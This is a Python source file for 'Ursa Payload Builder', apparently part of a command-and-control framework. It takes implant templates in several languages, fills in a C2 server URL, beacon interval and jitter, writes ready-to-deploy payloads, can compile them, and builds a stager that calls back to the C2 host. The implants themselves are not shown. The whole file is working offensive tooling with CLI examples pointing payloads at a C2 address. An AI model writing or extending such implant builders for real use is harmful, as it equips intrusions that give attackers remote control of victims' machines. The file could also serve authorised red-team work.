"""Ursa Payload Builder
======================
Loads implant templates from implants/templates/, substitutes URSA_* config
tokens, and produces ready-to-deploy payload files.

Supports any language — Python, Zig, Go, C, PowerShell, Bash, etc.
Template files can have any extension; the builder finds them by stem name.

Template token format
---------------------
Templates embed plain-string tokens that the builder replaces at build time:

    URSA_C2_URL     → C2 server URL,  e.g. "http://10.0.0.1:8443"
    URSA_INTERVAL   → beacon interval seconds,  e.g. "5"
    URSA_JITTER     → jitter factor 0.0-1.0,    e.g. "0.1"

Template naming
---------------
Each template is a single file in implants/templates/ with a unique stem:

    http_python.py      →  template name "http_python"
    http_zig.zig        →  template name "http_zig"
    http_go.go          →  template name "http_go"

Stems must be unique across extensions. If two files share the same stem
the first one (alphabetically by extension) is used.

post_build
----------
Compiled languages need a build step after source substitution.
Set post_build to a shell command; use {output} for the source file path
and {binary} for a suggested binary output path (same path, no extension).

    post_build="zig build-exe {output} -femit-bin={binary}"
    post_build="go build -o {binary} {output}"
    post_build="gcc {output} -o {binary}"

Usage (CLI)
-----------
    # List available templates (any language)
    python -m implants.builder list

    # Build Python payload to stdout
    python -m implants.builder build --c2 http://10.0.0.1:8443

    # Build Zig payload and compile it
    python -m implants.builder build --template http_zig \\
        --c2 http://10.0.0.1:8443 --output /tmp/agent.zig \\
        --post-build "zig build-exe {output} -femit-bin={binary}"

    # Build configured stager
    python -m implants.builder stager --c2 http://10.0.0.1:8443

Usage (Python API)
------------------
    from implants.builder import Builder, PayloadConfig

    cfg = PayloadConfig(
        c2_url="http://10.0.0.1:8443",
        template="http_zig",
        post_build="zig build-exe {output} -femit-bin={binary}",
    )
    builder = Builder()
    source_path = builder.build_to_file(cfg, Path("/tmp/agent.zig"))
    binary_path = builder.compile(cfg, source_path)   # runs zig compiler
"""

from __future__ import annotations

import argparse
import shlex
import socket
import subprocess
from dataclasses import dataclass, field
from pathlib import Path

TEMPLATES_DIR: Path = Path(__file__).parent / "templates"
STAGER_PATH: Path = Path(__file__).parent / "stager.py"


# ── Config ────────────────────────────────────────────────────────────────────


@dataclass
class PayloadConfig:
    """All runtime parameters for a generated payload."""

    c2_url: str
    interval: int = 5
    jitter: float = 0.1
    template: str = "http_python"
    # Shell command run after writing source to disk.
    # {output}  → the source file path
    # {binary}  → output path with extension stripped (suggested binary name)
    post_build: str = ""
    # Extra key-value pairs passed through as additional tokens.
    extra_tokens: dict[str, str] = field(default_factory=dict)

    def tokens(self) -> dict[str, str]:
        """Return the complete token → substitution-value mapping."""
        base = {
            "URSA_C2_URL": self.c2_url,
            "URSA_INTERVAL": str(self.interval),
            "URSA_JITTER": str(self.jitter),
        }
        base.update(self.extra_tokens)
        return base


# ── Builder ───────────────────────────────────────────────────────────────────


class Builder:
    """Loads template files and produces configured payload source strings."""

    def __init__(self, templates_dir: Path | None = None) -> None:
        self.templates_dir: Path = templates_dir or TEMPLATES_DIR

    # -- Discovery --

    def list_templates(self) -> list[str]:
        """Return template name stems sorted alphabetically.

        Includes all file extensions — .py, .zig, .go, .c, .ps1, etc.
        """
        if not self.templates_dir.exists():
            return []
        seen: set[str] = set()
        stems: list[str] = []
        for p in sorted(self.templates_dir.iterdir()):
            if p.is_file() and p.suffix and p.stem not in seen:
                seen.add(p.stem)
                stems.append(p.stem)
        return stems

    def template_path(self, name: str) -> Path:
        """Find a template file by stem. Returns the first match by extension.

        Raises FileNotFoundError if no file with that stem exists.
        """
        if not self.templates_dir.exists():
            raise FileNotFoundError(
                f"Templates directory not found: {self.templates_dir}"
            )
        matches = sorted(self.templates_dir.glob(f"{name}.*"))
        if not matches:
            available = self.list_templates()
            raise FileNotFoundError(
                f"Template '{name}' not found in {self.templates_dir}. "
                f"Available: {available if available else ['(none)']}"
            )
        return matches[0]

    # -- Core --

    def _substitute(self, source: str, config: PayloadConfig) -> str:
        for token, value in config.tokens().items():
            source = source.replace(token, value)
        return source

    def build(self, config: PayloadConfig) -> str:
        """Load a named template and substitute all tokens.

        Returns the configured payload source as a string.
        Raises FileNotFoundError if the template does not exist.
        """
        path = self.template_path(config.template)
        source = path.read_text(encoding="utf-8")
        return self._substitute(source, config)

    def build_stager(self, c2_url: str) -> str:
        """Build the stager with C2 URL substituted.

        Uses implants/stager.py as the source. Raises FileNotFoundError if missing.
        """
        if not STAGER_PATH.exists():
            raise FileNotFoundError(f"Stager source not found at {STAGER_PATH}")
        config = PayloadConfig(c2_url=c2_url)
        return self._substitute(STAGER_PATH.read_text(encoding="utf-8"), config)

    # -- Output --

    def write(self, source: str, output: Path) -> Path:
        """Write payload source to disk. Creates parent directories."""
        output.parent.mkdir(parents=True, exist_ok=True)
        output.write_text(source, encoding="utf-8")
        return output

    def build_to_file(self, config: PayloadConfig, output: Path) -> Path:
        """Build payload and write to output path. Returns the output path."""
        return self.write(self.build(config), output)

    def compile(self, config: PayloadConfig, source_path: Path) -> Path | None:
        """Run the post_build command for a compiled template.

        Substitutes {output} with source_path and {binary} with the path
        minus its extension. Returns the binary path if the command succeeds,
        None if post_build is empty.

        Raises subprocess.CalledProcessError on non-zero exit.
        """
        if not config.post_build:
            return None

        binary_path = source_path.with_suffix("")
        cmd_str = config.post_build.format(
            output=str(source_path),
            binary=str(binary_path),
        )
        cmd = shlex.split(cmd_str)
        subprocess.run(cmd, check=True)
        return binary_path

    def build_and_compile(
        self, config: PayloadConfig, output: Path
    ) -> tuple[Path, Path | None]:
        """Build to file then compile. Returns (source_path, binary_path|None)."""
        source_path = self.build_to_file(config, output)
        binary_path = self.compile(config, source_path)
        return source_path, binary_path


# ── Helpers ───────────────────────────────────────────────────────────────────


def detect_local_ip() -> str:
    """Best-effort local IP detection via UDP socket trick."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def auto_c2_url(port: int = 8443) -> str:
    """Build a C2 URL from the auto-detected local IP."""
    return f"http://{detect_local_ip()}:{port}"


# ── CLI ───────────────────────────────────────────────────────────────────────


def _add_c2_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument(
        "--c2", default=None,
        help="C2 server URL (auto-detected from local IP if omitted)",
    )


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(
        description="Ursa Payload Builder — generate configured implant payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python -m implants.builder list\n"
            "  python -m implants.builder build --c2 http://10.0.0.1:8443\n"
            "  python -m implants.builder build --template http_python "
            "--c2 http://10.0.0.1:8443 -o payload.py\n"
            "  python -m implants.builder build --template http_zig "
            "--c2 http://10.0.0.1:8443 -o /tmp/agent.zig "
            "--post-build 'zig build-exe {output} -femit-bin={binary}'\n"
            "  python -m implants.builder stager --c2 http://10.0.0.1:8443\n"
        ),
    )
    sub = parser.add_subparsers(dest="cmd", metavar="COMMAND")

    # -- list --
    sub.add_parser("list", help="List available templates (all languages)")

    # -- build --
    build_p = sub.add_parser("build", help="Build a payload from a template")
    build_p.add_argument(
        "--template", "-t", default="http_python",
        help="Template name without extension (default: http_python)",
    )
    _add_c2_args(build_p)
    build_p.add_argument("--interval", type=int, default=5,
                         help="Beacon interval seconds (default: 5)")
    build_p.add_argument("--jitter", type=float, default=0.1,
                         help="Jitter factor 0.0–1.0 (default: 0.1)")
    build_p.add_argument("--output", "-o", default=None,
                         help="Source output file (prints to stdout if omitted)")
    build_p.add_argument(
        "--post-build", dest="post_build", default="",
        help=(
            "Shell command to run after writing source. "
            "{output}=source path, {binary}=source path without extension. "
            "Example: 'zig build-exe {output} -femit-bin={binary}'"
        ),
    )

    # -- stager --
    stager_p = sub.add_parser("stager", help="Build a configured stager (implants/stager.py)")
    _add_c2_args(stager_p)
    stager_p.add_argument("--output", "-o", default=None,
                          help="Output file path (prints to stdout if omitted)")

    args = parser.parse_args(argv)
    builder = Builder()

    if args.cmd == "list":
        templates = builder.list_templates()
        if templates:
            print("Available templates:")
            for name in templates:
                try:
                    ext = builder.template_path(name).suffix
                except FileNotFoundError:
                    ext = ""
                print(f"  {name}  ({ext})")
        else:
            print(f"No templates found in {TEMPLATES_DIR}")
        return

    if args.cmd == "stager":
        c2_url = args.c2 or auto_c2_url()
        try:
            source = builder.build_stager(c2_url)
        except FileNotFoundError as exc:
            print(f"Error: {exc}")
            raise SystemExit(1) from exc
        if args.output:
            builder.write(source, Path(args.output))
            print(f"Stager written to: {args.output}")
        else:
            print(source)
        return

    if args.cmd == "build" or args.cmd is None:
        c2_url = getattr(args, "c2", None) or auto_c2_url()
        config = PayloadConfig(
            c2_url=c2_url,
            interval=getattr(args, "interval", 5),
            jitter=getattr(args, "jitter", 0.1),
            template=getattr(args, "template", "http_python"),
            post_build=getattr(args, "post_build", ""),
        )
        try:
            source = builder.build(config)
        except FileNotFoundError as exc:
            print(f"Error: {exc}")
            raise SystemExit(1) from exc

        output = getattr(args, "output", None)
        if output:
            source_path = builder.write(source, Path(output))
            print(f"Source written to: {source_path}")
            if config.post_build:
                try:
                    binary_path = builder.compile(config, source_path)
                    if binary_path:
                        print(f"Binary:           {binary_path}")
                except subprocess.CalledProcessError as exc:
                    print(f"Compile failed (exit {exc.returncode}): {exc.cmd}")
                    raise SystemExit(1) from exc
        else:
            print(source)
        return

    parser.print_help()


if __name__ == "__main__":
    main()
